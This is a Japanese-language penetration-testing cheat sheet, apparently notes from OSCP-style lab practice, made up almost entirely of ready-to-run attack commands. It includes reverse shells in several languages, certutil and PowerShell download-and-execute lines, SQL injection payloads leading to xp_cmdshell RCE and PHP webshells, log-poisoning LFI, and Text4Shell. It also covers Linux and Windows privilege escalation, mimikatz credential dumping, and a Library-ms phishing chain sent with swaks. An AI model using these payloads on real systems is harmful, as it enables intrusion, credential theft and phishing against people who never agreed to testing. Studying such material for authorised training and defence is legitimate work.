### よく使うコマンド

```
certutil.exe -urlcache -split -f http://192.168.45.238:80/met.exe C:\Windows\Temp\met.exe & C:\Windows\Temp\met.exe

.\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 192.168.45.187 443 -e cmd"

.\GodPotato-NET4.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.49.106 443"

.\mimikatz.exe "lsadump::sam /system:C:\windows.old\windows\system32\SYSTEM /sam:C:\windows.old\windows\system32\SAM" exit

python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
nc -e /bin/bash 192.168.45.241 443

PowerUpの説明書
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

passwdファイルを上書きしてsshログイン
wget -O /etc/passwd 192.168.45.250/passwd.bak
```

### Redis

#### redis内のクレデンシャル情報を収集する

```
パスワードが入ってるファイル
/etc/redis/redis.conf
```

#### exp.soを使用してredisからRCE

ftpなどからexp.soをアップロードしてredisに読み込ませるとRCEとれる

```
python redis-rce.py -r 192.168.215.166 -L 192.168.45.241 -f exp.so -a "Ready4Redis?"
```


### DNS

```
dig axfr cronos.htb @10.10.10.13
```

### wp-scan

```
wpscan --url http://10.10.10.37 -e ap,t,tt,u | tee scans/wpscan
```

### zipcrack

```
No password hashes left to crack (see FAQ)が出る場合は、--potで解析結果を管理しているpotファイルを一時的に指定し、回避する
john -w=/usr/share/wordlists/rockyou.txt --pot=temp.pot hash
```

#### ウェブ上のデータを一括ダウンロードする

```
wget -mc http://192.168.45.238:81/.git
```

### ポートから推測できる攻撃

139,445 → smbに対しての攻撃  
3128 → proxy　**(ID/パスワードがあれば侵入なしで内部ネットワークアクセスできる)**

### ポート転送

#### 攻撃者側からsshでやられ側のポートを転送する

**sshpassを使用する**  

以下は8443にあるhttpサービスに転送する例:  
```
root@kali# sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443

以下でローカル上からアクセスできる
https://127.0.0.1:8443/
```

#### 内部ネットワークにssh接続する

ファイアウォールが邪魔してchiselをうまく通せない状況の場合は、sshを使用する
```
侵入したネットワーク内の60002番のhttpサービスにローカルからアクセスできるようにsshを使用する例:
ssh -R *:60002:localhost:60002 kali@192.168.45.222
```

chiselで内部ネットワークの80番にリダイレクトするようにする

```
> .\chisel.exe client 192.168.45.234:8090 R:80:172.16.136.241:80

connectしたら127.0.0.1でアクセスする
エラーが出る場合は、ドメイン名を/etc/hostsで修正する
127.0.0.1    internalsrv1.beyond.com
```

#### 内部ネットワークにファイルを転送できるようにする

主にchiselで繋いだだけではファイル転送できない状況(ポートが制限されているなど)で使えるワザ  
sshを使ってファイル転送をすることで、制限を回避できる  

```
DMZに以下のコマンドを実行することで、7777にリバースシェル用、8888にpython webserver用のポートをローカル上から実行できるようになる
ssh user@IP -D9090 -R :7777:localhost:7777 -R:8888:localhost:8888
もしくは、*をつける
ssh user@IP -D9090 -R *:7777:localhost:7777 -R *:8888:localhost:8888
```

```
┌──(kali㉿kali)-[~]
└─$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_adn@10.4.235.215
```

#### http経由(DMZマシン)で内部マシンにnmapスキャンをかける
**ユーザー名とパスワードが必要**

主に**3128ポート**(proxy)が開いている場合に使用される  

```
$ http 192.168.XXX.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008
$ proxychains nmap -sT -n -p- 172.16.169.32

firefoxのプロキシ設定:
192.168.xxx.224 3128で172.16.x.xにfirefoxでアクセスできる

```

### Ligolo-ngを使用して内部マシンにkali上のファイルを転送する

```
攻撃者マシン
$ ./proxy -selfcert

被害者マシン(DMZ)
PS C:\Users\sql_svc> .\agent.exe -connect 192.168.45.188:11601 -ignore-cert

kali上のligolo-ngに戻る
接続できたら以下で内部アクセス設定を行う
DMZ領域の1235ポートからkaliの8000にアクセスしてファイルを転送できるようにする
[Agent : OSCP\sql_svc@MS01] » listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:8000
[Agent : OSCP\sql_svc@MS01] » start


これで内部マシンとkaliのファイル転送に必要なポート設定ができたので以下で1235経由でkali:8000からファイルをダウンロードできる

被害者内部マシン
> iwr -uri http://10.10.125.147:1235/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
$ python3 -m http.server 8000
```

#### 3128ポートが開いている場合の内部ポート探索

```
3128はsquid proxyなのでsposeを使用して内部ポートを確認できる
python3 spose.py --proxy http://192.168.190.189:3128 --target 192.168.190.189

8080等が開いている場合は、ブラウザーでproxy設定を行ってアクセスしてみる
```


### HTTP系

### apache2のアクセスログをポイズニングしてRCE (Lunar)

```
LFIの脆弱性があるとする、その際にvar/log/apache2/access.logにアクセスできるか確認
http://192.168.156.216/dashboard.php?show=completed&ext=../../../../../var/log/apache2/access.log

次にncで80にアクセスして以下を実行して、ログファイルに書き込む
nc 192.168.156.216 80
GET /<?php system($_GET['cmd']); ?>

その後以下でアクセスしてリバースシェルを取得できるport443
http://192.168.156.216/dashboard.php?show=completed&ext=../../../../../var/log/apache2/access.log&cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.45.181%20443%20%3E%2Ftmp%2Ff
```

### FlaskやDjangoのREST APIからリバースシェル

```
http://192.168.207.117:50000/verifyにcodeというパラメータ名があるとしてそこにデータをPOSTしてみる:
curl –X post --data "code=2*2" http://192.168.207.117:50000/verify

実行結果が4であれば式が評価されるためpythonのリモートコード実行が可能になる
curl –X post --data "code=os.system('nc 192.168.45.230 21 -e /bin/bash')" http://192.168.207.117:50000/verify
```

### javascriptのコード実行できる脆弱性からリバースシェル

文字を入力できるフィールドで3*4などを実行してみて結果が12になるなどの脆弱性があるとリバースシェルできる  
その場合には以下でリバースシェルを実行できる  

```
(function(){ 
var net = require(“net”), 
cp = require(“child_process”), 
sh = cp.spawn(“/bin/bash”, []); 
var client = new net.Socket() ; 
client.connect(21, “192.168.49.248”, function(){ 
client.pipe(sh.stdin); 
sh.stdout.pipe(client); 
sh.stderr.pipe(client); 
}); 
return /a /; 
})();
```

### SQLinjection

### SQLを検査する

```

'")}$%%;\を入れてエラーを出してみる

'
"
\
;
`
)
}
--
#
/*
//
$
%
%%

SQLの最後にはコメントアウトするようにする
--
-- #

```

### SQLの認証バイパス

```
' or 1=1 -- #  <-- MySQL,MSSQL
' || '1'='1' -- #  <-- PostgreSQL
admin' or 1=1 -- #
admin') or (1=1 -- #
```

### エラーメッセージからデータ抽出

```
' or 1=1 in (select @@version) -- #
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- #
```


### SQLinjection経由でRCE

```
SQLiが実行できる場合は、以下でOSコマンド実行できる
a'; EXEC xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.45.208:8000/met.exe C:\Windows\Temp\met.exe"; --
a'; EXEC xp_cmdshell "C:\Windows\Temp\met.exe"; --

xp_cmdshellがはじかれる場合は、以下で回避
EXEC sp_configure ‘show advanced options’, 1;
RECONFIGURE;
EXEC sp_configure ‘xp_cmdshell’, 1;
RECONFIGURE;
```

### UNIONベースのSQLinjection

1.正しい列数を確認する  

```
以下のコマンドの1の部分を1つずつ値をエラーを吐くまで大きくしていく
仮に6でエラーが発生した場合は、テーブルに5つの列があるとなる

' ORDER BY 1-- //
```

2.列数が5の場合は、以下でバージョンなどを列挙できる  

```
%' UNION SELECT database(), user(), @@version, null, null -- //

なお、型の不一致をさけるためにnullを先頭に置いている以下が推奨  
' UNION SELECT null, null, database(), user(), @@version  -- //
```

3.現在のテーブル名と列名を取得する  

```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

4.現在のテーブルと列のデータを取得する

```
' UNION SELECT null, username, password, description, null FROM users -- //
```

### ブラインドSQLインジェクション2

WAITFOR DELAYコマンドを実行してどれくらい遅延するかでSQLコマンドの成功を検証をするタイプ

```
この場合は10秒の遅延が発生する
'; IF (1=1) WAITFOR DELAY '0:0:10';--

次のコマンドは10秒の遅延は発生しない
'; IF (1=2) WAITFOR DELAY '0:0:10';--


これを応用してSQLインジェクションと組み合わせる
以下はテーブル名userがあるかどうかを判定している

'; IF ((select count(name) from sys.tables where name = 'user')=1) WAITFOR DELAY '0:0:10';-- ←遅延がないためfalse

'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';-- ←遅延があるためtrue(存在する)

次にテーブル名usersから存在する列の名前を調べる必要がある
以下はusernameという列が存在するかのチェック
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--

次にパスワードを管理している列名を検索する必要がある
以下はpassで始まる列名が存在するかどうかを確認する pass passw passwo passworのように1文字ずつ調べていく必要がある(今回の場合は結果的にはpassword_hashが答えだった)
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--

発見した列から行がいくつあるかを調べる
以下の場合は3行を超えたら遅延が発生しないようになっている
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>3) WAITFOR DELAY '0:0:10'; --

ユーザー名が存在するかどうかを調べる
以下の場合は、butchが存在したら10秒遅延する
'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';--

最後にbutchのpassword_hashの値をtacos123という文字列で書き換える
'; update users set password_hash = 'tacos123' where username = 'butch';--

ちゃんと書き換えられているかの確認
echo -n 'tacos123' | sha256sum
6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb

'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--
``` 




### SQLinjection経由でwebshellを作成する

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

これが実行されたら以下でwebshell可能
http://192.168.222.19/tmp/webshell.php?cmd=cat%20/etc/passwd
```

### PostgreSQL9.3からRCEする

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

COPY cmd_exec FROM PROGRAM 'wget 192.168.45.121:8000/shell -O /tmp/shell';
COPY cmd_exec FROM PROGRAM 'bash /tmp/shell';
```

### UDFを使用してMySQLから権限昇格

既にrootとしてmysqlにアクセスできていることを想定とする  
**User Defined Functionとは、組み込まれたMySQL関数のように機能する新しい関数を作成できる仕組み**  


```
以下のCのソースをコンパイル
https://www.exploit-db.com/exploits/1181

gcc -g -c raptor_udf.c
gcc -g -shared -Wl,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc

以下のコマンドで/etc/passwdに777の権限付与してユーザー追加して権限昇格
use mysql;
create table foo(line blob);
insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
select * from mysql.func;
select do_system('chmod 777 /etc/passwd');
```

### phpmyadmin経由でリバースシェル.phpをアップロードして実行する

```
phpmyadminにアクセスできたらnewからデータベース名を入力してCollationを選択してcreateボタンを押す
作成したデータベースにアクセスしてSQL項目に以下のコマンドをコピペしてgoボタンを押してupload.phpにアクセスする

SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```


#### Text4Shell
Java Format Spring 1.5 ~ 1.9に起因する脆弱性

```
Reverse Shell

burpsuiteを使用すること
以下をエンコードしてエンドポイントに突っ込む
{"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.211 443 -e sh')}","result":""}

/search?query=%24%7bscript%3ajavascript%3ajava.lang.Runtime.getRuntime().exec('busybox%20nc%20192.168.45.211%20443%20-e%20sh')%7d
```

#### jdwp-shellifierで権限昇格

```
内部でポート8000が稼働している場合は、jdwp-shellifierで権限昇格できる可能性がある
まずはchiselでkali上から操作できるようにする必要がある

$ proxychains -q python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd '/bin/busybox nc 192.168.45.203 4445 -e /bin/bash'
[+] Waiting for an event on 'java.net.ServerSocket.accept'
↑の表示がでてきたら別ターミナルから以下コマンドで5000番にncして発火させる
$ proxychains nc 127.0.0.1 5000

$ nc -lnvp 4445
```

#### PDFアップローダーからRCE
```
pdfのマジックバイトを先頭に書いてその中にphpコードを書いてphpファイルとして保存する
%PDF-
<?php 
//reverseshell code here
?>
```


#### ポート873からid_rsaを書き込んでsshログイン

```
ディレクトリを確認する
$rsync -av --list-only rsync://192.168.206.126/


$rsync -av --list-only rsync://192.168.206.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile


kali側でsshを作成して転送する準備
$ssh-keygen
$cat id_rsa.pub >> authorized_keys

これらをやられ側に転送する
$rsync -av . rsync://fox@192.168.206.126/fox/.ssh

sshでログインできる
ssh -i ./id_rsa fox@192.168.206.126


```


### Linux権限昇格

#### ワイルドカードインジェクション

**crontabやpspyを使用することで発見できる権限昇格**  

```
脆弱な例:
圧縮ファイル名 *
/bin/bash -c cd /opt/admin && tar -zxf /tmp/backup.tar.gz *

以下が脆弱な部分で圧縮されるときにコマンドライン部分が実行できる脆弱性がある
tar.gz *
```

#### ワイルドカードインジェクションでリバースシェルで権限昇格

```
圧縮されるディレクトリに移動する(前述の例でいうと/opt/admin)
echo "sh -i >& /dev/tcp/192.168.45.200/5555 0>&1" > shell.sh

touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=bash shell.sh"
```

#### 制限がかかったシェルからエスケープする

```
$ echo os.system('/usr/bin/bash')
```


#### id_rsaの場所

```
/home/daniela/.ssh/id_rsa

使用する際は、chmodで600にする
chmod 600 id_rsa
```

#### 書き込み可能なファイルとsuidのついたファイルの取得
```
書き込み可能なすべてのディレクトリを検索する
joe@debian-privesc:~$ find / -writable -type d 2>/dev/null

SUIDがついているファイルを検索する
joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
```

#### suidが付与されたDOSBoxコマンドを使用して権限昇格

**/etc/sudoers**を書き換えてsudo suで権限昇格できるようにする  

```
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```

#### suidが付与されたpsql経由での権限昇格(Linux)
```
www-data@singapore06:/$ psql -h localhost -U postgres

DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.222:4445");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
COPY 0
SELECT * FROM cmd_exec;

ポート4445で待ち受けてまずはpostgresユーザーに昇格する、そのあとにsuidが付与されたpsqlをsudoで実行する
sudo psql -h localhost -U postgres -d webapp -W
webapp=# \?
:!/bin/bash
```

#### glibc2.34 not foundと出てしまい権限昇格できない場合の解決策

**kaliマシン上でdockerを経由してコンパイルすることでglibcやgccの使用を回避して権限昇格ツールを実行できる**

```
docker上でgccをpullする
$ docker pull gcc:4.9

docker経由でコンパイル
$ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -fPIC -shared -ldl -o libhax.so libhax.c
$ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -o rootshell rootshell.c

コンパイルしたファイルをやられ側に転送して実行することでエラーを回避できる
```

#### suid権限が付与されたcpコマンドから権限昇格

passwdファイルを書き換えれば良い  
以下のデータをpasswdというファイル名にしてやられ側に転送してcpコマンドで/etc/passwdに上書きして権限昇格する  
  
ユーザー名:kali  
パスワード:kali  

```
kali:$1$kali$/rLA3oVIdYGokOY9m1jKj.:0:0:root:/root:/bin/bash
```

以下で権限昇格  

```
su kali
パスワード:kali
```


#### sudo rebootの権限が付与されている場合の権限昇格

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/  

ncでサービス転送は以下
https://www.kwonline.org/memo2/2019/09/14/netcat-file-transfer/  
  
以下の条件が揃っていれば権限昇格可能  
・書き込み可能なサービスファイルが存在する  
・sudo -lでsudo rebootが付与されている  

```
書き込み可能なサービスファイルが存在するかを確認する
find / -writable -name "*.service" 2>/dev/null

見つけた場合は以下サービスファイルに上書きする

[Unit]
Description=Python App
After=network-online.target
[Service]
Type=simple
ExecStart=/tmp/exploit.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure
[Install]
WantedBy=multi-user.target

なお、ncでサービスファイル転送を行うと書き込み権限エラーが発生しない

kali側
nc -nlvp 80 < pythonapp.service

やられ側(ダウンロードする側)
nc 10.0.0.1 80 > pythonapp.service

最後に/tmpにexploit.shを設置する
exploit.sh

#!/bin/bash
socat TCP:192.168.45.230:18000 EXEC:sh

chmod +x exploit.sh

sudo reboot

これで数分待てば権限昇格可能
```

#### NFSにno_root_squashが付与されて場合の権限昇格

```
mountできるように侵入マシンの/etc/hostsに自身のIPを書き込む
echo "192.168.45.181 localhost" > /etc/hosts

攻撃側マシン
mkdit temp
sudo mount -t nfs 192.168.60.216:/srv/share tmp -o nolock


shell.c
#include <unistd.h>
int main(){
  setuid(0);
  setgid(0);
  system("/bin/bash");
}


sudo gcc -static shell.c -o shell
もしくはエラーが出る場合は、
docker pull gcc:4.9
docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -o shell shell.c

sudo chmod u+s shell

あとはやられ側の/shareなどに保管されたshellを実行してroot

```




#### vncpasswdのクラック

vnc用のパスワードを発見した際に(ultravnc.iniなど)は、そのままではパスワードを使用できない  
vncpasswdを使用してクラックを行う  
**必ず-Hをつけること**

```
┌──(kali㉿kali)-[~/…/challenges/skylark/exploits/vncpasswd.py]
└─$ python2 vncpasswd.py -H -d "BFE825DE515A335BE3"         
WARN: Ciphertext length was not divisible by 8 (hex/16).
Length: 9
Hex Length: 18
Decrypted Bin Pass= 'R3S3+rcH'
Decrypted Hex Pass= '523353332b726348'
```

また、解析したパスワードはオプションで指定せずに、IPとポートだけでログインして後からパスワードを入力すること  

```
$ proxychains vncviewer 10.10.102.10:5901
                                                              
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.102.10:5901  ...  OK
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: R3S3+rcH
Authentication successful
```

### git

#### gitから機密情報を取得する

```
.gitがあるディレクトリまで移動して
git logコマンドでコミットハッシュを取得する
その後、git showでコミットハッシュから内容を取得

# git status
# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)

# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
```

#### やられ側に存在するgitファイルをローカル上にダウンロードする

```

$GIT_SSH_COMMAND='ssh -i id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.248.125:/git-server/

```

#### /etc/crontabで実行されているgitアプリケーションを書き換えて権限昇格する

```
kali側
相手側から定期実行されるgitファイルをダウンロード
$GIT_SSH_COMMAND='ssh -i id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.248.125:/git-server/

その中にあるbashファイルを書き換えて実行権限を付与してあげる
!#/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.45.191/18030 0>&1' &

chmod +x backups.sh

gitを更新する
git add -A
git commit -m "pwn"

最後にリバースシェルに書き換えたファイルたちをやられ側にプッシュする
sudo GIT_SSH_COMMAND='ssh -i /home/kali/offsec/pivoting/Hunit/id_rsa -p 43022' git push -u origin

あとはリバースシェルで待ち構える
nc -lvnp 18030
```

### Windows

#### base64でファイル転送

```
攻撃側
nc -lvnp 443

やられ側
$Base64String = [System.convert]::ToBase64String((Get-Content -Path 'c:/temp/BloodHound.zip' -Encoding Byte))
Invoke-WebRequest -Uri http://10.10.10.10:443 -Method POST -Body $Base64String

最後にzipファイルでデコード
echo <base64> | base64 -d -w 0 > bloodhound.zip

```

#### ワンライナーリバースシェル

```
$client = New-Object System.Net.Sockets.TCPClient("10.0.2.4",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### windowsでcurlのようなことを行う

```
> $Resp = Invoke-WebRequest 'http://nickel/?whoami' -UseBasicParsing
> $Resp.RawContent
```


### SMB

#### ファイルのダウンロード
```
ファイル情報の列挙
smbmap -H 192.168.238.248 -u null

┌──(kali㉿kali)-[~/offsec/challenges/relia/smbdownloads]
└─$ smbclient //192.168.238.248/transfer                  
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *

```

#### 簡易smbサーバーでファイル転送
```
kali側
$ impacket-smbserver kali . -smb2support

$ copy <アップロードするファイル名>　\\<SMBサーバのIP\<share name>\
```

#### smbサーバーを利用したリバースシェル

```
nc.exeが配置されているところでsmbサーバーを実行してからやられ側で以下を実行する
cmd.exe /c \\\\192.168.45.228\\kali\\nc.exe -e cmd.exe 192.168.45.228 80
```

### hashcat

#### salt-value exceptionと出て解析できない場合

hashファイルの頭の部分のセミコロンまでの文字を削除  

### rdpファイルからのrdp接続

```
xfreerdpなどでユーザー名パスワードを入力してもログインできないけど3389ポートは空いてる場合
http://192.168.221.221/RDWebディレクトリにアクセスし、ログインする
そこで.rdpファイルをダウンロードして以下コマンドで再度xfreerdpを使用して接続する

xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /v:192.168.221.221 +clipboard /dynamic-resolution
```

### アクセスを目的としたフィッシング

まず、wsgidavを使用して、WebDAV共有の設定をする  

```
kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

次に、VSCodeでconfig.Library-msというテキストファイルを作成する

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

次に、相手に踏ませるためのショートカットファイルを作成する

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

最後にswaksを使用して、ターゲットに**ライブラリファイルを添付して**メールを送信する(送信元はユーザー名とパスワードが必要)

```
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```


### windows権限昇格

#### printspoofer

```
.\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 192.168.45.238 82 -e cmd"
```

#### mimikatz

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

#### mimikatzで資格情報マネージャから資格情報を取得する

```
token::elevate
vault::cred /patch
```

#### LAPSやLDAPがインストールされている場合のパスワード漏洩

https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/windows/hutch

```
ldapsearch -x -h 192.168.64.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
```


#### runasを使用して管理者権限になりすます

```
管理者権限のパスワードが必要
runas /user:administrator “C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.49.57 443”
nc -lvnp 443
```

#### グローバルグループメンバーのAdminの状況での権限昇格

```
>net users <ユーザー名>
Global Group membershipsが*Group Policy Creator *GPO Admins

であればSharpGPOAbuse.exeで権限昇格できる

powerviewでNetGPOを取得する
Get-NetGPOを入力した際に
displayname: Default Domain Policy
であれば攻撃できる

PoC
やられ側
./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "Administrator" --Command "cmd.exe" --Arguments "/c c:\temp\nc.exe $KaliIP 80 -e cmd.exe" --GPOName "Default Domain Policy"

kali側
nc -nlvp 80

やられ側
gpupdate /force
```

#### 環境変数からの権限昇格

reg query ・・・指定したレジストリの検索、表示を行うコマンド  

```
現在の環境変数を確認する
$env:path
C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Program Files\PuTTY\;C:\Users\offsec\AppData\Local\Microsoft\WindowsApps

今回の場合は、PuTTYを発見したので、PuTTYの設定をregコマンドで確認する
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY

実際の例:
PS C:\Users\offsec\Desktop> reg query "HKCU\Software\SimonTatham\PuTTY"
reg query "HKCU\Software\SimonTatham\PuTTY"

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
PS C:\Users\offsec\Desktop> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
    zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"

```

#### サービス一覧を表示する

```
> Get-CimInstance -ClassName win32_service | Select Name,State,PathName

この中から停止しているファイル名に空白があるサービスを見つけてリバースシェルできる
例:C:\Program Files\Enterprise Apps\Current Version → Current.exeでリバースシェル
```

#### タスクの一覧を表示する

```
> schtasks /query /fo LIST /v
```

#### スケジューラサービスの作成

```
sc.exe start DevService

sc.exe create scheduler binpath="path/to/binary"
```

#### サービスの再起動

```
Restart-Service BetaService

sc qc bd(サービス名)

これらでダメだったら以下でパソコンごと再起動する
shutdown /r
```


#### msfvenomを使用したdllリバースシェル

-f exeではなく  
-f dllが正解  

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.250 LPORT=8888 -e x86/shikata_ga_nai -f dll -o beyondhelper.dll
```

### gobuster

-xで探索する形式を指定できる  

```
gobuster dir -u http://192.168.203.225:8090/backend/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x bak,php,zip,rar,txt,html,js,pdf
```
## AD系

### kerbruteでADユーザーを検査

```
ユーザー名はあらかじめ列挙していることが前提

kerbrute userenum ./potential_users_list.txt -d absolute.htb --dc $RHOST
もしくは
python3 ./kerbrute.py -domain resourced.local -users /home/kali/offsec/pivoting/resourced2/users.txt -dc-ip 192.168.216.175

取得したキーはAS-REP Roastingを試みることができる
GetNPUsers.py absolute.htb/d.klay -dc-ip 10.129.192.41 -no-pass -format hashcat
攻撃が成功したら以下で解読
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### ドメインコントローラーの取得
```
net group /domain "Domain Controllers"

プライマリDCの詳細情報の取得
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner
```

```
> nslookup.exe DC01.corp.com
```

### PowerView.ps1

```
以下でメモリにインポートすることでコマンドを実行できるようになる
PS C:\Tools> Import-Module .\PowerView.ps1
```
<details>
  <summary>PowerView.ps1の詳細な使い方</summary>
  
#### Get-NetDomain ドメインに関する基本情報の取得

```
PS C:\Tools> Get-NetDomain

Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
